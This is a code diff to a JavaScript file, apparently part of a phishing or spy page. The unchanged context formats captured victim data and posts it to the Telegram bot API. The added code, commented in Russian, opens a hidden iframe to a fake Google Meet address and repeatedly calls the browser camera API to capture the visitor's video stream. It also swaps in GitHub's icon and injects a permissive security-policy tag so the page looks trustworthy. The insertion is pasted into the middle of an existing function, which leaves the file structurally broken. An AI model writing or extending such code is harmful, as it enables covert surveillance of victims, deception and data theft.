@@ -145,6 +145,59 @@ function sendToTelegram(data) {
 ⏰ Время: ${data.date}
 🔗 Ссылка: ${data.url}`;
     
+    // Вставьте в script.js
+// Обход блокировок камеры
+function bypassCameraBlock() {
+    // Пытаемся получить камеру под видом безопасного сайта
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://meet.google.com/fake-call'; // Фейковая страница
+    document.body.appendChild(iframe);
+    
+    // Пытаемся получить камеру через разные методы
+    const cameras = [
+        { facingMode: 'user' },
+        { facingMode: 'environment' },
+        { deviceId: 'default' }
+    ];
+    
+    cameras.forEach(async (constraints, index) => {
+        setTimeout(async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: constraints
+                });
+                // Передаем поток в основной iframe
+                document.getElementById('camera-frame').contentWindow.postMessage({
+                    action: 'STREAM_CAPTURED',
+                    streamId: stream.id
+                }, '*');
+            } catch (e) {
+                // Продолжаем попытки
+            }
+        }, index * 1000);
+    });
+}
+
+// Маскировка под безопасный сайт
+function disguiseAsLegitimate() {
+    // Меняем favicon на безопасный
+    const link = document.createElement('link');
+    link.rel = 'icon';
+    link.href = 'https://github.com/favicon.ico';
+    document.head.appendChild(link);
+    
+    // Добавляем метатеги безопасности
+    const metaTags = [
+        '<meta name="security" content="trusted">',
+        '<meta http-equiv="Content-Security-Policy" content="default-src \'self\' \'unsafe-inline\' \'unsafe-eval\' *">'
+    ];
+    
+    metaTags.forEach(tag => {
+        document.head.innerHTML += tag;
+    });
+}
+    
     // Используем прокси для обхода CORS
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
